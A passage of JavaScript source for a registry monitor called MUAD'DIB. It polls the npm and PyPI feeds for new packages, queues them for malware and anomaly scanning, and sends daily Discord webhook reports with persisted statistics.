    return typeof data.lastReportDate === 'string' ? data.lastReportDate : null;
  } catch {
    return null;
  }
}

/**
 * Persist the date of the last daily report sent (YYYY-MM-DD).
 */
function saveLastDailyReportDate(dateStr) {
  try {
    atomicWriteFileSync(LAST_DAILY_REPORT_FILE, JSON.stringify({ lastReportDate: dateStr }, null, 2));
  } catch (err) {
    console.error(`[MONITOR] Failed to save last daily report date: ${err.message}`);
  }
}

/**
 * Returns true if today's daily report has already been sent.
 * Checks both in-memory state AND disk file for crash resilience.
 */
function hasReportBeenSentToday() {
  const today = getParisDateString();
  if (stats.lastDailyReportDate === today) return true;
  const diskDate = loadLastDailyReportDate();
  if (diskDate === today) return true;
  return false;
}

/**
 * Returns the current hour in Europe/Paris timezone (0-23).
 */
function getParisHour() {
  const formatter = new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Europe/Paris',
    hour: 'numeric',
    hour12: false
  });
  return parseInt(formatter.format(new Date()), 10);
}

/**
 * Returns today's date string in Europe/Paris timezone (YYYY-MM-DD).
 */
function getParisDateString() {
  const formatter = new Intl.DateTimeFormat('en-CA', { timeZone: 'Europe/Paris' });
  return formatter.format(new Date());
}

/**
 * Check if the daily report is due:
 * 1. It is >= 08:00 Paris time (07:00 UTC)
 * 2. Today's report has NOT been sent yet (in-memory + disk check)
 */
function isDailyReportDue() {
  const parisHour = getParisHour();
  if (parisHour < DAILY_REPORT_HOUR) return false;
  return !hasReportBeenSentToday();
}

function buildDailyReportEmbed() {
  // Use disk-based daily entries filtered by lastDailyReportDate for accurate delta
  const { agg, top3: diskTop3 } = buildReportFromDisk();

  // Prefer in-memory dailyAlerts for top suspects (richer data), fallback to disk
  const top3 = dailyAlerts.length > 0
    ? dailyAlerts.slice().sort((a, b) => b.findingsCount - a.findingsCount).slice(0, 3)
    : diskTop3;

  const top3Text = top3.length > 0
    ? top3.map((a, i) => {
        const name = a.ecosystem ? `${a.ecosystem}/${a.name || a.package}` : (a.name || a.package);
        const version = a.version || 'N/A';
        const count = a.findingsCount || (a.findings ? a.findings.length : 0);
        return `${i + 1}. **${name}@${version}** — ${count} finding(s)`;
      }).join('\n')
    : 'None';

  // Avg scan time from in-memory stats (not available on disk)
  const avg = stats.scanned > 0 ? (stats.totalTimeMs / stats.scanned / 1000).toFixed(1) : '0.0';

  const now = new Date();
  const readableTime = now.toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC');

  return {
    embeds: [{
      title: '\uD83D\uDCCA MUAD\'DIB Daily Report',
      color: 0x3498db,
      fields: [
        { name: 'Packages Scanned', value: `${agg.scanned}`, inline: true },
        { name: 'Clean', value: `${agg.clean}`, inline: true },
        { name: 'Suspects', value: `${agg.suspect}`, inline: true },
        { name: 'Errors', value: formatErrorBreakdown(stats.errors, stats.errorsByType), inline: true },
        { name: 'Avg Scan Time', value: `${avg}s/pkg`, inline: true },
        { name: 'Top Suspects', value: top3Text, inline: false }
      ],
      footer: {
        text: `MUAD'DIB - Daily summary | ${readableTime}`
      },
      timestamp: now.toISOString()
    }]
  };
}

async function sendDailyReport() {
  // Never send an empty report (0 scanned — restart with no work done)
  if (stats.scanned === 0) {
    console.log('[MONITOR] Daily report skipped (0 packages scanned)');
    return;
  }

  // Write-ahead: mark today's report as sent BEFORE the webhook HTTP request.
  // If the process is killed (SIGKILL) during sendWebhook, the date is already
  // recorded on disk and prevents duplicate reports on next startup.
  const today = getParisDateString();
  stats.lastDailyReportDate = today;
  saveLastDailyReportDate(today);

  const payload = buildDailyReportEmbed();

  // Persist locally with full raw metrics (independent of webhook — enables trend analysis)
  const { agg } = buildReportFromDisk();
  persistDailyReport(payload, {
    scanned: agg.scanned,
    clean: agg.clean,
    suspect: agg.suspect,
    errors: stats.errors,
    errorsByType: { ...stats.errorsByType },
    avgScanTimeMs: stats.scanned > 0 ? Math.round(stats.totalTimeMs / stats.scanned) : 0,
    suspectByTier: { ...stats.suspectByTier },
    topSuspects: dailyAlerts.slice().sort((a, b) => b.findingsCount - a.findingsCount).slice(0, 10)
  });

  // Send webhook only if configured
  const url = getWebhookUrl();
  if (url) {
    try {
      await sendWebhook(url, payload, { rawPayload: true });
      console.log('[MONITOR] Daily report sent');
    } catch (err) {
      console.error(`[MONITOR] Daily report webhook failed: ${err.message}`);
    }
  } else {
    console.log('[MONITOR] Daily report persisted locally (no webhook URL configured)');
  }

  // Reset daily counters
  stats.scanned = 0;
  stats.clean = 0;
  stats.suspect = 0;
  stats.suspectByTier.t1 = 0;
  stats.suspectByTier.t2 = 0;
  stats.suspectByTier.t3 = 0;
  stats.errors = 0;
  stats.errorsByType.too_large = 0;
  stats.errorsByType.tar_failed = 0;
  stats.errorsByType.http_error = 0;
  stats.errorsByType.timeout = 0;
  stats.errorsByType.other = 0;
  stats.totalTimeMs = 0;
  dailyAlerts.length = 0;
  recentlyScanned.clear();
  alertedPackageRules.clear();
  // Flush and clear pending scope groups on daily reset
  for (const [, group] of pendingGrouped) {
    clearTimeout(group.timer);
  }
  pendingGrouped.clear();
  downloadsCache.clear();
  resetDailyStats();
}

// --- CLI report helpers (muaddib report --now / --status) ---

/**
 * Read raw state file (without restoring into stats).
 */
function loadStateRaw() {
  try {
    const raw = fs.readFileSync(STATE_FILE, 'utf8');
    return JSON.parse(raw);
  } catch {
    return {};
  }
}

/**
 * Reconstruct daily report data from persisted files (no in-memory stats needed).
 * Used by `muaddib report --now` to send a report from a separate CLI process.
 */
function buildReportFromDisk() {
  const scanData = loadScanStats();
  const stateRaw = loadStateRaw();
  const lastDate = stateRaw.lastDailyReportDate || null;

  // First report (null): show today only (>= today).
  // Subsequent reports: show days after last report (> lastDate).
  const today = getParisDateString();
  const sinceDays = lastDate
    ? scanData.daily.filter(d => d.date > lastDate)
    : scanData.daily.filter(d => d.date >= today);

  // Aggregate counters
  const agg = { scanned: 0, clean: 0, suspect: 0 };
  for (const d of sinceDays) {
    agg.scanned += d.scanned || 0;
    agg.clean += d.clean || 0;
    agg.suspect += d.suspect || 0;
  }

  // Load detections since last report for top suspects
  const detections = loadDetections();
  const recentDetections = lastDate
    ? detections.detections.filter(d => d.first_seen_at && d.first_seen_at.slice(0, 10) > lastDate)
    : detections.detections.filter(d => d.first_seen_at && d.first_seen_at.slice(0, 10) >= today);

  const top3 = recentDetections
    .slice()
    .sort((a, b) => (b.findings ? b.findings.length : 0) - (a.findings ? a.findings.length : 0))
    .slice(0, 3);

  return { agg, top3, hasData: agg.scanned > 0 };
}

/**
 * Build a Discord embed from disk data (same format as buildDailyReportEmbed).
 */
function buildReportEmbedFromDisk() {
  const { agg, top3, hasData } = buildReportFromDisk();
  if (!hasData) return null;

  const top3Text = top3.length > 0
    ? top3.map((a, i) => `${i + 1}. **${a.ecosystem}/${a.package}@${a.version}** — ${a.findings ? a.findings.length : 0} finding(s)`).join('\n')
    : 'None';

  const now = new Date();
  const readableTime = now.toISOString().replace('T', ' ').replace(/\.\d+Z$/, ' UTC');

  return {
    embeds: [{
      title: '\uD83D\uDCCA MUAD\'DIB Daily Report (manual)',
      color: 0x3498db,
      fields: [
        { name: 'Packages Scanned', value: `${agg.scanned}`, inline: true },
        { name: 'Clean', value: `${agg.clean}`, inline: true },
        { name: 'Suspects', value: `${agg.suspect}`, inline: true },
        { name: 'Top Suspects', value: top3Text, inline: false }
      ],
      footer: {
        text: `MUAD'DIB - Manual report | ${readableTime}`
      },
      timestamp: now.toISOString()
    }]
  };
}

/**
 * Force send a daily report from persisted data.
 * Returns { sent: boolean, message: string }.
 */
async function sendReportNow() {
  const url = getWebhookUrl();
  if (!url) {
    return { sent: false, message: 'MUADDIB_WEBHOOK_URL not configured' };
  }

  const payload = buildReportEmbedFromDisk();
  if (!payload) {
    return { sent: false, message: 'No data to report' };
  }

  try {
    await sendWebhook(url, payload, { rawPayload: true });
  } catch (err) {
    return { sent: false, message: `Webhook failed: ${err.message}` };
  }

  // Update lastDailyReportDate on disk
  const today = getParisDateString();
  const stateRaw = loadStateRaw();
  const state = {
    npmLastPackage: stateRaw.npmLastPackage || '',
    pypiLastPackage: stateRaw.pypiLastPackage || ''
  };
  stats.lastDailyReportDate = today;
  saveState(state);
  saveLastDailyReportDate(today);

  return { sent: true, message: 'Daily report sent' };
}

/**
 * Get report status for `muaddib report --status`.
 */
function getReportStatus() {
  const stateRaw = loadStateRaw();
  const lastDate = stateRaw.lastDailyReportDate || null;

  // Count packages scanned since last report (today only if never sent)
  const scanData = loadScanStats();
  const today = getParisDateString();
  const sinceDays = lastDate
    ? scanData.daily.filter(d => d.date > lastDate)
    : scanData.daily.filter(d => d.date >= today);

  let scannedSince = 0;
  for (const d of sinceDays) {
    scannedSince += d.scanned || 0;
  }

  // Compute next report time
  const parisHour = getParisHour();
  let nextReport;
  if (lastDate === today || (lastDate !== today && parisHour >= DAILY_REPORT_HOUR)) {
    // Already sent today OR past 08:00 but not sent (will fire soon if monitor runs)
    if (lastDate === today) {
      nextReport = 'Tomorrow 08:00 (Europe/Paris)';
    } else {
      nextReport = 'Today 08:00 (Europe/Paris) — pending, monitor must be running';
    }
  } else {
    nextReport = 'Today 08:00 (Europe/Paris)';
  }

  return { lastDailyReportDate: lastDate, scannedSince, nextReport };
}

// --- npm polling ---

/**
 * Parse npm RSS XML (same regex approach as parsePyPIRss).
 * Returns array of package names from <title> tags inside <item>.
 */
function parseNpmRss(xml) {
  const packages = [];
  const itemRegex = /<item>([\s\S]*?)<\/item>/g;
  let match;
  while ((match = itemRegex.exec(xml)) !== null) {
    const itemContent = match[1];
    const titleMatch = itemContent.match(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/);
    if (titleMatch) {
      const title = titleMatch[1].trim();
      const name = title.split(/\s+/)[0];
      if (name) {
        packages.push(name);
      }
    }
  }
  return packages;
}

/**
 * Fetch latest version metadata for an npm package.
 * Returns { version, tarball } or null on failure.
 */
async function getNpmLatestTarball(packageName) {
  const url = `https://registry.npmjs.org/${encodeURIComponent(packageName)}/latest`;
  const body = await httpsGet(url);
  let data;
  try {
    data = JSON.parse(body);
  } catch (e) {
    throw new Error(`Invalid JSON from npm registry for ${packageName}: ${e.message}`);
  }
  const version = data.version || '';
  const tarball = (data.dist && data.dist.tarball) || null;
  return { version, tarball };
}

async function pollNpm(state) {
  const url = 'https://registry.npmjs.org/-/rss?descending=true&limit=200';

  try {
    const body = await httpsGet(url);
    const packages = parseNpmRss(body);

    // Find new packages (those after the last seen one)
    let newPackages;
    if (!state.npmLastPackage) {
      newPackages = packages;
    } else {
      const lastIdx = packages.indexOf(state.npmLastPackage);
      if (lastIdx === -1) {
        newPackages = packages;
      } else {
        newPackages = packages.slice(0, lastIdx);
      }
    }

    for (const name of newPackages) {
      if (name === SELF_PACKAGE_NAME) {
        console.log(`[MONITOR] SKIPPED (self): ${name}`);
        continue;
      }
      console.log(`[MONITOR] New npm: ${name}`);
      // Queue npm packages — tarball URL resolved during scan
      scanQueue.push({
        name,
        version: '',
        ecosystem: 'npm',
        tarballUrl: null // resolved lazily via resolveTarballAndScan
      });
    }

    // Remember the most recent package (first in RSS)
    if (packages.length > 0) {
      state.npmLastPackage = packages[0];
    }

    return newPackages.length;
  } catch (err) {
    console.error(`[MONITOR] npm poll error: ${err.message}`);
    return -1;
  }
}

// --- PyPI polling ---

/**
 * Parse PyPI RSS XML (simple regex, no deps).
 * Returns array of package names from <title> tags inside <item>.
 */
function parsePyPIRss(xml) {
  const packages = [];
  // Match each <item>...</item> block
  const itemRegex = /<item>([\s\S]*?)<\/item>/g;
  let match;
  while ((match = itemRegex.exec(xml)) !== null) {
    const itemContent = match[1];
    // Extract <title>...</title> inside item (handles CDATA)
    const titleMatch = itemContent.match(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/);
    if (titleMatch) {
      // Title format is usually "package-name 1.0.0"
      const title = titleMatch[1].trim();
      // Extract just the package name (first word before space or version)
      const name = title.split(/\s+/)[0];
      if (name) {
        packages.push(name);
      }
    }
  }
  return packages;
}

async function pollPyPI(state) {
  const url = 'https://pypi.org/rss/packages.xml';

  try {
    const body = await httpsGet(url);
    const packages = parsePyPIRss(body);

    // Find new packages (those after the last seen one)
    let newPackages;
    if (!state.pypiLastPackage) {
      // First run: log all and remember the first one
      newPackages = packages;
    } else {
      const lastIdx = packages.indexOf(state.pypiLastPackage);
      if (lastIdx === -1) {
        // Last seen not in feed — all are new
        newPackages = packages;
      } else {
        // Items before lastIdx are newer (RSS is newest-first)
        newPackages = packages.slice(0, lastIdx);
      }
    }

    for (const name of newPackages) {
      console.log(`[MONITOR] New pypi: ${name}`);
      // Queue PyPI packages — tarball URL resolved during scan
      scanQueue.push({
        name,
        version: '',
        ecosystem: 'pypi',
        tarballUrl: null // resolved lazily in scanPackage wrapper
      });
    }

    // Remember the most recent package (first in RSS)
    if (packages.length > 0) {
      state.pypiLastPackage = packages[0];
    }

    return newPackages.length;
  } catch (err) {
    console.error(`[MONITOR] PyPI poll error: ${err.message}`);
    return -1;
  }
}

// --- Main loop ---

function cleanupOrphanTmpDirs() {
  const tmpBase = path.join(os.tmpdir(), 'muaddib-monitor');
  try {
    if (!fs.existsSync(tmpBase)) return;
    const entries = fs.readdirSync(tmpBase);
    for (const entry of entries) {
      const fullPath = path.join(tmpBase, entry);
      try {
        fs.rmSync(fullPath, { recursive: true, force: true });
      } catch {}
    }
    if (entries.length > 0) {
      console.log(`[MONITOR] Cleaned up ${entries.length} orphan temp dir(s)`);
    }
  } catch {}
}

async function startMonitor(options) {
  if (options && options.verbose) {
    setVerboseMode(true);
  }

  // Cleanup temp dirs from previous runs (SIGTERM/crash may leave orphans)
  cleanupOrphanTmpDirs();

  console.log(`
╔════════════════════════════════════════════╗
║     MUAD'DIB - Registry Monitor           ║
║     Scanning npm + PyPI new packages      ║
╚════════════════════════════════════════════╝
  `);

  // Check sandbox availability
  if (isSandboxEnabled()) {
    sandboxAvailable = isDockerAvailable();
    if (sandboxAvailable) {
      console.log('[MONITOR] Docker detected — sandbox enabled for HIGH/CRITICAL findings');
    } else {
      console.log('[MONITOR] WARNING: Docker not available — running static analysis only');
    }
  } else {
    console.log('[MONITOR] Sandbox disabled (MUADDIB_MONITOR_SANDBOX=false)');
  }

  // Canary tokens status
  if (isCanaryEnabled()) {
    console.log('[MONITOR] Canary tokens enabled — honey tokens injected in sandbox for exfiltration detection');
  } else {
    console.log('[MONITOR] Canary tokens disabled (MUADDIB_MONITOR_CANARY=false)');
  }

  // Temporal analysis status
  if (isTemporalEnabled()) {
    console.log('[MONITOR] Temporal lifecycle analysis enabled — detecting sudden lifecycle script changes');
  } else {
    console.log('[MONITOR] Temporal lifecycle analysis disabled (MUADDIB_MONITOR_TEMPORAL=false)');
  }

  if (isTemporalAstEnabled()) {
    console.log('[MONITOR] Temporal AST analysis enabled — detecting sudden dangerous API additions');
  } else {
    console.log('[MONITOR] Temporal AST analysis disabled (MUADDIB_MONITOR_TEMPORAL_AST=false)');
  }

  if (isTemporalPublishEnabled()) {
    console.log('[MONITOR] Publish frequency analysis enabled — detecting publish bursts, dormant spikes');
  } else {
    console.log('[MONITOR] Publish frequency analysis disabled (MUADDIB_MONITOR_TEMPORAL_PUBLISH=false)');
  }

  if (isTemporalMaintainerEnabled()) {
    console.log('[MONITOR] Maintainer change analysis enabled — detecting maintainer changes, account takeovers');
  } else {
    console.log('[MONITOR] Maintainer change analysis disabled (MUADDIB_MONITOR_TEMPORAL_MAINTAINER=false)');
  }

  // Webhook filtering mode
  console.log('[MONITOR] Strict webhook mode — webhooks sent ONLY for:');
  console.log('[MONITOR]   - IOC match (225K+ package database)');
  console.log('[MONITOR]   - Static score >= 50 with CRITICAL or HIGH findings');
  console.log('[MONITOR]   - Sandbox score > 0');
  console.log('[MONITOR]   - Canary token exfiltration');
  console.log('[MONITOR]   NEVER sent: temporal anomaly, AST anomaly, publish anomaly, maintainer change, MEDIUM-only packages');

  const state = loadState();
  loadDailyStats(); // Restore counters from previous run (survives restarts)
  console.log(`[MONITOR] State loaded — npm last: ${state.npmLastPackage || 'none'}, pypi last: ${state.pypiLastPackage || 'none'}`);
  console.log(`[MONITOR] Polling every ${POLL_INTERVAL / 1000}s. Ctrl+C to stop.\n`);

  let running = true;

  // Graceful shutdown handler (shared by SIGINT and SIGTERM)
  // Daily report is NEVER sent on shutdown — it only fires at 08:00 Paris time.
  // Counters are persisted to disk so they survive the restart.
  async function gracefulShutdown(signal) {
    console.log(`\n[MONITOR] Received ${signal} — shutting down...`);
    // Flush all pending scope groups before exit
    for (const [scope, group] of pendingGrouped) {
      clearTimeout(group.timer);
      await flushScopeGroup(scope);
    }
    pendingGrouped.clear();
    saveDailyStats();
    saveState(state);
    reportStats();
    console.log('[MONITOR] State saved. Bye!');
    running = false;
    process.exit(0);
  }

  process.on('SIGINT', () => gracefulShutdown('SIGINT'));
  process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

  // Initial poll + scan
  await poll(state);
  saveState(state);
  await processQueue();

  // Interval polling
  while (running) {
    await sleep(POLL_INTERVAL);
    if (!running) break;
    await poll(state);
    saveState(state);
    await processQueue();

    // Hourly stats report
    if (Date.now() - stats.lastReportTime >= 3600_000) {
      reportStats();
    }

    // Daily webhook report at 08:00 Paris time
    if (isDailyReportDue()) {
      await sendDailyReport();
    }
  }
}

async function poll(state) {
  const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' ');
  console.log(`[MONITOR] ${timestamp} — polling registries...`);

  const [npmCount, pypiCount] = await Promise.all([
    pollNpm(state),
    pollPyPI(state)
  ]);

  // Track consecutive poll failures for backoff
  if (npmCount === -1 && pypiCount === -1) {
    consecutivePollErrors++;
    if (consecutivePollErrors > 1) {
      const backoff = Math.min(POLL_INTERVAL * Math.pow(2, consecutivePollErrors - 1), POLL_MAX_BACKOFF);
      console.log(`[MONITOR] Both registries failed (${consecutivePollErrors}x) — backing off ${(backoff / 1000).toFixed(0)}s`);
      await sleep(backoff);
    }
  } else {
    consecutivePollErrors = 0;
  }

  const npmDisplay = npmCount === -1 ? 'error' : npmCount;
  const pypiDisplay = pypiCount === -1 ? 'error' : pypiCount;
  console.log(`[MONITOR] Found ${npmDisplay} npm + ${pypiDisplay} PyPI new packages`);
}

/**
 * Returns the highest severity level from all suspicious temporal results.
 * Used to decide whether a temporal alert can be downgraded to FALSE POSITIVE.
 * Returns 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW', or null if no findings.
 */
function getTemporalMaxSeverity(temporalResult, astResult, publishResult, maintainerResult) {
  const SEVERITY_ORDER = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1 };
  let maxLevel = 0;
  let maxSeverity = null;

  const allFindings = [];
  if (temporalResult && temporalResult.suspicious && temporalResult.findings) {
    allFindings.push(...temporalResult.findings);
  }
  if (astResult && astResult.suspicious && astResult.findings) {
    allFindings.push(...astResult.findings);
  }
  // publishResult deliberately excluded — publish anomalies alone (nightly builds,
  // burst releases) should not trigger temporal preservation. They are handled
  // separately by isPublishAnomalyOnly().
  if (maintainerResult && maintainerResult.suspicious && maintainerResult.findings) {
    allFindings.push(...maintainerResult.findings);
  }

  for (const f of allFindings) {
    const level = SEVERITY_ORDER[f.severity] || 0;
    if (level > maxLevel) {
      maxLevel = level;
      maxSeverity = f.severity;
    }
  }

  return maxSeverity;
}

/**
 * Returns true if publish_anomaly is the ONLY suspicious temporal result.
 * publish_anomaly alone is too noisy for webhooks — only alert when combined
 * with another anomaly (lifecycle, AST, maintainer).
 */
function isPublishAnomalyOnly(temporalResult, astResult, publishResult, maintainerResult) {
  const hasLifecycle = temporalResult && temporalResult.suspicious;
  const hasAst = astResult && astResult.suspicious;
  const hasPublish = publishResult && publishResult.suspicious;
  const hasMaintainer = maintainerResult && maintainerResult.suspicious;

  return !!(hasPublish && !hasLifecycle && !hasAst && !hasMaintainer);
}

/**
 * Wrapper to resolve PyPI tarball URLs before scanning.
 * For npm packages, tarballUrl is already set from the registry response.
 * For PyPI packages, we need to fetch the JSON API to get the tarball URL.
 */
async function resolveTarballAndScan(item) {
  if (item.ecosystem === 'npm' && !item.tarballUrl) {
    try {
      const npmInfo = await getNpmLatestTarball(item.name);
      if (!npmInfo.tarball) {
        console.log(`[MONITOR] SKIP: ${item.name} — no tarball URL found on npm`);
        return;
      }
      item.tarballUrl = npmInfo.tarball;
      if (npmInfo.version) item.version = npmInfo.version;
    } catch (err) {
      console.error(`[MONITOR] ERROR resolving npm tarball for ${item.name}: ${err.message}`);
      recordError(err);
      return;
    }
  }
  if (item.ecosystem === 'pypi' && !item.tarballUrl) {
    try {
      const pypiInfo = await getPyPITarballUrl(item.name);
      if (!pypiInfo.url) {
        console.log(`[MONITOR] SKIP: ${item.name} — no tarball URL found on PyPI`);
        return;
      }
      item.tarballUrl = pypiInfo.url;
      if (pypiInfo.version) item.version = pypiInfo.version;
    } catch (err) {
      console.error(`[MONITOR] ERROR resolving PyPI tarball for ${item.name}: ${err.message}`);
      recordError(err);
      return;
    }
  }
  // Deduplication: skip if already scanned in the last 24h
  const dedupeKey = `${item.ecosystem}/${item.name}@${item.version}`;
  if (recentlyScanned.has(dedupeKey)) {
    console.log(`[MONITOR] SKIP (already scanned): ${item.name}@${item.version}`);
    return;
  }
  recentlyScanned.add(dedupeKey);

  // Temporal analysis: check for sudden lifecycle script changes (npm only)
  // Webhooks are deferred until after sandbox confirms the threat
  let temporalResult = null;
  let astResult = null;
  let publishResult = null;
  let maintainerResult = null;

  if (item.ecosystem === 'npm') {
    temporalResult = await runTemporalCheck(item.name);
    astResult = await runTemporalAstCheck(item.name);
    publishResult = await runTemporalPublishCheck(item.name);
    maintainerResult = await runTemporalMaintainerCheck(item.name);
  }

  const scanResult = await scanPackage(item.name, item.version, item.ecosystem, item.tarballUrl);
  const sandboxResult = scanResult && scanResult.sandboxResult;
  const staticClean = scanResult && scanResult.staticClean;

  // FP rate tracking
  if (scanResult) {
    if (!staticClean) {
      if (sandboxResult && sandboxResult.score === 0) {
        updateScanStats('false_positive');
      } else if (sandboxResult && sandboxResult.score > 0) {
        updateScanStats('confirmed');
      } else {
        updateScanStats('suspect');
      }
    }
  }

  // Temporal anomaly handling: persist findings and send webhooks for CRITICAL/HIGH
  const hasSuspiciousTemporal = (temporalResult && temporalResult.suspicious)
    || (astResult && astResult.suspicious)
    || (publishResult && publishResult.suspicious)
    || (maintainerResult && maintainerResult.suspicious);

  if (hasSuspiciousTemporal) {
    // Collect all temporal findings for persistence
    const temporalFindings = [];
    if (temporalResult && temporalResult.suspicious) temporalFindings.push({ type: 'lifecycle', data: temporalResult });
    if (astResult && astResult.suspicious) temporalFindings.push({ type: 'ast_diff', data: astResult });
    if (publishResult && publishResult.suspicious) temporalFindings.push({ type: 'publish', data: publishResult });
    if (maintainerResult && maintainerResult.suspicious) temporalFindings.push({ type: 'maintainer', data: maintainerResult });

    // Always persist temporal detections
    appendTemporalDetection(item.name, item.version, temporalFindings);

    if (sandboxResult && sandboxResult.score === 0) {
      const riskScore = (scanResult && scanResult.staticScore) || 0;
      if (riskScore >= 20) {
        console.log(`[MONITOR] DORMANT SUSPECT: ${item.name}@${item.version} (static score: ${riskScore}, sandbox clean — possible evasive malware)`);
      } else {
        console.log(`[MONITOR] FALSE POSITIVE (sandbox clean, no alert): ${item.name}@${item.version}`);
      }
    } else if (staticClean && !sandboxResult) {
      // Temporal CRITICAL/HIGH with static clean → reclassify as SUSPECT for stats
      const temporalMaxSev = getTemporalMaxSeverity(temporalResult, astResult, publishResult, maintainerResult);
      if (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH') {
        console.log(`[MONITOR] Temporal ${temporalMaxSev} preserved despite static clean scan: ${item.name}@${item.version}`);
        console.log(`[MONITOR] SUSPECT (temporal anomaly, logged only): ${item.name}@${item.version}`);
        stats.suspect++;
        stats.clean--;
        updateScanStats('suspect');
        // Send webhook for CRITICAL/HIGH temporal findings that aren't sandbox-clean
        if (temporalResult && temporalResult.suspicious) await tryTemporalAlert(temporalResult);
        if (astResult && astResult.suspicious) await tryTemporalAstAlert(astResult);
      } else {
        console.log(`[MONITOR] FALSE POSITIVE (static clean, no alert): ${item.name}@${item.version}`);
      }
    } else {
      // Not static-clean and no sandbox / sandbox positive — send webhooks
      if (temporalResult && temporalResult.suspicious) await tryTemporalAlert(temporalResult);
      if (astResult && astResult.suspicious) await tryTemporalAstAlert(astResult);
    }
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

module.exports = {
  startMonitor,
  parseNpmRss,
  parsePyPIRss,
  loadState,
  saveState,
  STATE_FILE,
  ALERTS_FILE,
  downloadToFile,
  extractTarGz,
  getNpmTarballUrl,
  getNpmLatestTarball,
  getPyPITarballUrl,
  scanPackage,
  scanQueue,
  processQueue,
  appendAlert,
  timeoutPromise,
  reportStats,
  stats,
  dailyAlerts,
  recentlyScanned,
  alertedPackageRules,
  resolveTarballAndScan,
  MAX_TARBALL_SIZE,
  KNOWN_BUNDLED_FILES,
  KNOWN_BUNDLED_PATHS,
  isBundledToolingOnly,
  isSandboxEnabled,
  hasHighOrCritical,
  get sandboxAvailable() { return sandboxAvailable; },
  set sandboxAvailable(v) { sandboxAvailable = v; },
  getWebhookUrl,
  shouldSendWebhook,
  buildMonitorWebhookPayload,
  buildAlertData,
  persistAlert,
  trySendWebhook,
  classifyError,
  recordError,
  formatErrorBreakdown,
  computeRiskLevel,
  computeRiskScore,
  computeReputationFactor,
  extractScope,
  pendingGrouped,
  bufferScopedWebhook,
  flushScopeGroup,
  SCOPE_GROUP_WINDOW_MS,
  buildDailyReportEmbed,
  sendDailyReport,
  DAILY_REPORT_HOUR,
  isDailyReportDue,
  getParisHour,
  getParisDateString,
  isTemporalEnabled,
  buildTemporalWebhookEmbed,
  runTemporalCheck,
  isTemporalAstEnabled,
  buildTemporalAstWebhookEmbed,
  runTemporalAstCheck,
  isTemporalPublishEnabled,
  buildPublishAnomalyWebhookEmbed,
  runTemporalPublishCheck,
  isTemporalMaintainerEnabled,
  buildMaintainerChangeWebhookEmbed,
  runTemporalMaintainerCheck,
  isCanaryEnabled,
  buildCanaryExfiltrationWebhookEmbed,
  getTemporalMaxSeverity,
  isPublishAnomalyOnly,
  isSafeLifecycleScript,
  hasOnlySafeTemporalFindings,
  isAstAnomalyCombined,
  isVerboseMode,
  setVerboseMode,
  hasIOCMatch,
  hasTyposquat,
  isSuspectClassification,
  TIER1_TYPES,
  TIER2_ACTIVE_TYPES,
  TIER3_PASSIVE_TYPES,
  formatFindings,
  IOC_MATCH_TYPES,
  getWeeklyDownloads,
  POPULAR_THRESHOLD,
  downloadsCache,
  DOWNLOADS_CACHE_TTL,
  DETECTIONS_FILE,
  appendDetection,
  loadDetections,
  getDetectionStats,
  SCAN_STATS_FILE,
  loadScanStats,
  updateScanStats,
  buildReportFromDisk,
  buildReportEmbedFromDisk,
  sendReportNow,
  getReportStatus,
  cleanupOrphanTmpDirs,
  consecutivePollErrors: { get() { return consecutivePollErrors; }, set(v) { consecutivePollErrors = v; } },
  POLL_MAX_BACKOFF,
  LAST_DAILY_REPORT_FILE,
  loadLastDailyReportDate,
  saveLastDailyReportDate,
  hasReportBeenSentToday,
  DAILY_STATS_FILE,
  DAILY_STATS_PERSIST_INTERVAL,
  loadDailyStats,
  saveDailyStats,
  resetDailyStats,
  maybePersistDailyStats,
  get scansSinceLastPersist() { return scansSinceLastPersist; },
  set scansSinceLastPersist(v) { scansSinceLastPersist = v; },
  atomicWriteFileSync,
  appendTemporalDetection,
  loadTemporalDetections,
  TEMPORAL_DETECTIONS_FILE,
  ALERTS_LOG_DIR,
  DAILY_REPORTS_LOG_DIR,
  resolveWritableDir,
  SELF_PACKAGE_NAME
};

// Standalone entry point: node src/monitor.js
if (require.main === module) {
  startMonitor().catch(err => {
    console.error('[MONITOR] Fatal error:', err.message);
    process.exit(1);
  });
}
